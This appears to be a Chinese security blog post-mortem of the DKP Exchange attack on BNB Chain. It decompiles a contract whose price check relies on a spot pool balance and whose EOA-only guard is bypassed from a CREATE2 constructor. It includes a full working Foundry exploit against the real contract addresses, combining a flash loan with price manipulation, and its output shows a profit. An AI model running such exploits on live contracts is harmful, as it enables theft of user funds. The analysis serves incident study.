---
title: "DKP Exchange 攻击事件分析"
date: 2023-03-24T20:16:27+08:00
draft: false
author: yinhui
categories: [security]
tags: [defi] 
---

DKP Exchange 攻击事件分析

<!--more-->



## 背景

攻击tx: https://bscscan.com/tx/0x0c850f54c1b497c077109b3d2ef13c042bb70f7f697201bcf2a4d0cb95e74271

获利tx: https://bscscan.com/tx/0x2d31e45dce58572a99c51357164dc5283ff0c02d609250df1e6f4248bd62ee01

[DKP Exchange 合约](https://bscscan.com/address/0x89257A52Ad585Aacb1137fCc8abbD03a963B9683)提供了 [DKP token](https://bscscan.com/address/0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19) 和 [BUSD](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955)的交换功能 , 但在其交换函数(exchange)中使用了错误的DKP token的价格查询逻辑, 而遭到了黑客的价格操纵攻击. 虽然合约在交换函数中做了"不允许合约(CA)而只允许外部账户(EOA)调用交换函数", 但被轻松绕过了

## 代码分析

DKP Exchange 的代码并没有verify, 所以只能看到字节码

```
0x608060405234801561001057600080fd5b50600436106101c45760003560e01c8063961bdfbf116100f9578063d42568f711610097578063e6db271311610071578063e6db2713146104bf578063f2fde38b146104dd578063fd19016c146104f9578063fdc65aa714610517576101c4565b8063d42568f714610455578063e176895e14610471578063e274a7bc146104a1576101c4565b8063b2d34d55116100d3578063b2d34d55146103cd578063bb11049f146103fd57806......
```

> 到https://bscscan.com/address/0x89257A52Ad585Aacb1137fCc8abbD03a963B9683#code 查看完整代码

但可以使用反编译工具反编译一下

> 这里查看完整的反编译后的代码: https://github.com/yinhui1984/imagehosting/blob/main/images/1679661755618031000.sol

其`exchange()`函数如下

```solidity
function exchange(uint256 varg0) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 32);
    0x2a44(varg0);
    
    //重点代码1
    require(msg.sender.code.size <= 0, Error('no isContract'));
    
    require(varg0 >= stor_9, Error('num >= propor'));
    v0 = _SafeAdd(varg0, owner_a[msg.sender]);
    owner_a[msg.sender] = v0;
    0x1a69(varg0, stor_10_0_19, msg.sender, _usdt);
    require(owner_e_0_19.code.size);
    v1, v2, v3, v4 = owner_e_0_19.staticcall(0xbd52993b, msg.sender).gas(msg.gas);
    require(v1); 
    MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 96);
    0x2a16(v2);
    0x2a16(v3);
    0x2a16(v4);
    
    //重点代码2
    v5 = 0x1201();
    
    v6 = 0x1af2(varg0, v5);
    v7 = 0x1b6d(0xde0b6b3a7640000, v6);
    v8 = v9 = 0;
    if (address(v2) != 0) {
        v10 = 0x1af2(_one, v7);
        v11 = 0x1b6d(_exchange, v10);
        v8 = v12 = _SafeAdd(v11, v9);
        v13 = _SafeAdd(v11, owner_b[address(v2)]);
        owner_b[address(v2)] = v13;
    }
    if (address(v3) != 0) {
        v14 = 0x1af2(stor_6, v7);
        v15 = 0x1b6d(_exchange, v14);
        v8 = v16 = _SafeAdd(v15, v8);
        v17 = _SafeAdd(v15, owner_b[address(v3)]);
        owner_b[address(v3)] = v17;
    }
    if (address(v4) != 0) {
        v18 = 0x1af2(_three, v7);
        v19 = 0x1b6d(_exchange, v18);
        v8 = v20 = _SafeAdd(v19, v8);
        v21 = _SafeAdd(v19, owner_b[address(v4)]);
        owner_b[address(v4)] = v21;
    }
    v22 = 0x1af2(stor_8, v7);
    v23 = 0x1b6d(_exchange, v22);
    v24 = _SafeAdd(v23, v8);
    0x1972(v23, stor_f_0_19, stor_3_0_19);
    v25 = _SafeSub(v24, v7);
    0x1972(v25, msg.sender, stor_3_0_19);
}
```

### 重点代码1

合约中 `require(msg.sender.code.size <= 0, Error('no isContract'));` 这行代码是检查函数调用者不能是合约, 开发者还是有一点安全意识的(但不多), 怕被黑干脆不让合约调用.

### 重点代码2

`v5 = 0x1201();` 转到函数 0x1201代码如下:

```solidity
function 0x1201() private { 
    require(stor_3_0_19.code.size);
    v0, v1 = stor_3_0_19.balanceOf(_lp).gas(msg.gas);
    require(v0); // checks call status, propagates error data on error
    MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    0x2a44(v1);
    require(_usdt.code.size);
    v2, v3 = _usdt.balanceOf(_lp).gas(msg.gas);
    require(v2); // checks call status, propagates error data on error
    MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    0x2a44(v3);
    v4 = 0x1af2(0xde0b6b3a7640000, v1);
    v5 = 0x1b6d(v3, v4);
    return v5;
}
```

其中`0x1b6d` 

```solidity
function 0x1b6d(uint256 varg0, uint256 varg1) private { 
    require(varg0 > 0, Error('SafeMath: division by zero'));
    v0 = _SafeDiv(varg1, varg0);
    return v0;
}
```

也就是说, 其先查询了`_lp`在`stor_3_0_19`和`_usdt`这两个token上的余额, 然后返回值是两个数相除, 嗯, 嗅到了不安全的味道~

继续搞清楚`_lp` ,`stor_3_0_19`和`_usdt`  分别指的什么:

查看反编译代码的开头部分

```
uint160 _lp; // STORAGE[0x1] bytes 0 to 19
address _usdt; // STORAGE[0x2] bytes 0 to 19
address stor_3_0_19; // STORAGE[0x3] bytes 0 to 19
```

它们分别在slot1, slot2, solt3, 为了读出他们值,我们利用一下小工具: https://github.com/yinhui1984/GetStorageAt

```apl
~/Doc/github/hac/DKPDemo ❯ getstorageat 0x89257A52Ad585Aacb1137fCc8abbD03a963B9683 1
Using provider: RPC connection http://127.0.0.1:8545
AS HEX:     0x000000000000000000000000be654fa75bad4fd82d3611391fda6628bb000cc7
AS INT:     1086967560541184621808388775946026158076085669063
AS BYTES:   b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xbeeO\xa7[\xadO\xd8-6\x119\x1f\xdaf(\xbb\x00\x0c\xc7'
AS STRING:  Not a string
AS ADDRESS: 0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7
~/Doc/github/hac/DKPDemo ❯ getstorageat 0x89257A52Ad585Aacb1137fCc8abbD03a963B9683 2
Using provider: RPC connection http://127.0.0.1:8545
AS HEX:     0x00000000000000000000000055d398326f99059ff775485246999027b3197955
AS INT:     489982930986835137684486657990555633941558688085
AS BYTES:   b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00U\xd3\x982o\x99\x05\x9f\xf7uHRF\x99\x90'\xb3\x19yU"
AS STRING:  Not a string
AS ADDRESS: 0x55d398326f99059fF775485246999027B3197955
~/Doc/github/hac/DKPDemo ❯ getstorageat 0x89257A52Ad585Aacb1137fCc8abbD03a963B9683 3
Using provider: RPC connection http://127.0.0.1:8545
AS HEX:     0x000000000000000000000000d06fa1ba7c80f8e113c2dc669a23a9524775cf19
AS INT:     1189959551584444714248724787054917716618572582681
AS BYTES:   b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd0o\xa1\xba|\x80\xf8\xe1\x13\xc2\xdcf\x9a#\xa9RGu\xcf\x19'
AS STRING:  Not a string
AS ADDRESS: 0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19
```

分别是3个地址

[0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7](https://bscscan.com/address/0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7)  : PancakeSwapV2 上的一个PAIR

[0x55d398326f99059fF775485246999027B3197955 ](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) : BUSD

[0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19](https://bscscan.com/address/0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19)  : DKP token

也就是说`0x1201()`函数,  查询了 PancakeSwapV2 上的一个PAIR的 BUSD 和 DKP 余额, 然后将余额相除并返回. 继续研究代码发现`exchange()`函数就是用的这个`0x1201()`函数进行的价格查询,以便将一定数量的美元换成DKP 给用户 (实际就是实现了一个买币函数)

这就给了黑客价格操纵的机会.



## 漏洞利用

### 价格操纵

日常操作, 利用闪电贷在`0x1201()`查询价格时用到的PAIR中借走绝大多数BUSD, 让DKP token价格异常便宜. 就可以用少量的BUSD进行大量买入. 

### 绕过合约检查

由于`exchange`函数中  `require(msg.sender.code.size <= 0, Error('no isContract'));` 条件的限制, 攻击合约是不能直接调用`exchange`函数的.

但是, 使用代码size是否为0来作为调用是否来自合约的判断条件是有问题的. 合约在"run time"时代码size是大于0的,但在"creation time",由于合约还正在部署过程中,所以其code size这时为0, 要在"creation time"执行代码逻辑,那自然就是合约的构造函数, 所以在合约的构造函数中调用`exchange`函数是可以绕过上面的条件检查的. 关于这个问题可以参考 [Ethernaut第15个挑战题目](https://github.com/yinhui1984/EthernautGameReferenceAnswers/blob/main/15_GatekepperTwo.md)

另外一个问题是,  调用`exchange`需要钱(去买DKP), 如何在合约还没部署完成时向合约转账,让它有钱呢.

所以需要事先知道合约的地址, 向其转账,然后再部署合约,部署合约时再其构造函数中进行`exchange`调用.

这就需要用到Create2: https://github.com/yinhui1984/SolidityReference/blob/main/docs/new.md#create2



## POC

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function decimals() external view returns (uint8);
}

interface IUniswapV2Pair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IDKPExchange {
    function exchange(uint256 amount) external;
}

IERC20 constant DKP = IERC20(0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19);
IERC20 constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
IUniswapV2Pair constant Pair = IUniswapV2Pair(
    0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7
);
IRouter constant Router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
IDKPExchange constant DKPExchange = IDKPExchange(
    0x89257A52Ad585Aacb1137fCc8abbD03a963B9683
);

contract RunAsNotContract {
    constructor() {
        BUSD.approve(address(DKPExchange), type(uint256).max);
        DKPExchange.exchange(100 * 10 ** BUSD.decimals());
        BUSD.approve(address(DKPExchange), 0);
        DKP.transfer(msg.sender, DKP.balanceOf(address(this)));
    }
}

contract Hack is Test {
    uint256 flashAmount;
    bytes32 the_salt = bytes32(keccak256("the_salt_string"));

    function setUp() public {
        vm.createSelectFork("theNet", 26284131);
        deal(address(BUSD), address(this), 1000 * 10 ** BUSD.decimals());
    }

    function testHack() public {
        emit log_named_decimal_uint(
            "BUSD balance at the beginning",
            BUSD.balanceOf(address(this)),
            BUSD.decimals()
        );

        //借走PAIR中的绝大部分BUSD，让DKP变得非常便宜
        flashAmount = caculateSwapAmount();
        Pair.swap(flashAmount, 0, address(this), abi.encode(flashAmount));

        //兑换BUSD，贷款回调执行完成后再兑换，否则报错"Pancake: LOCKED"
        DKP2BUSD();

        emit log_named_decimal_uint(
            "BUSD balance at the end",
            BUSD.balanceOf(address(this)),
            BUSD.decimals()
        );
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        //不能直接调用,其判断了调用方是否是合约，其只允许EOA进行exchange
        //DKPExchange.exchange(xxx); // 报错： "no isContract"
        //use this:
        address calcultedAddress = calculteSpecialContractAddress();
        BUSD.transfer(calcultedAddress, 100 * 10 ** BUSD.decimals());
        RunAsNotContract c = new RunAsNotContract{salt: the_salt}(); // exploit in constructor
        assert(address(c) == calcultedAddress);

        emit log_named_decimal_uint(
            "DKP balance",
            DKP.balanceOf(address(this)),
            DKP.decimals()
        );

        //还贷款
        uint256 returnAmount = (flashAmount * 10_000) / 9975 + 1000;
        BUSD.transfer(address(Pair), returnAmount);
    }

    function caculateSwapAmount() private returns (uint256) {
        uint256 b = BUSD.balanceOf(address(Pair));
        emit log_named_decimal_uint("BUSD balance of Pair", b, BUSD.decimals());

        uint256 a = (b * 9992) / 10000; // 99.92 %
        emit log_named_decimal_uint("I will borrow out", a, BUSD.decimals());

        return a;
    }

    function calculteSpecialContractAddress() private view returns (address) {
        address predictedAddress = address(
            uint160(
                uint(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xff),
                            address(this),
                            the_salt,
                            keccak256(
                                abi.encodePacked(
                                    type(RunAsNotContract).creationCode
                                )
                            )
                        )
                    )
                )
            )
        );

        return predictedAddress;
    }

    function DKP2BUSD() private {
        DKP.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(DKP);
        path[1] = address(BUSD);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            DKP.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
        DKP.approve(address(Router), 0);
    }
}

```



输出:

```
[PASS] testHack() (gas: 520036)
Logs:
  BUSD balance at the beginning: 1000.000000000000000000
  BUSD balance of Pair: 259605.445236391899433885
  I will borrow out: 259397.760880202785914337
  DKP balance: 17666.042408805118459861
  BUSD balance at the end: 81512.615981085813934882
```













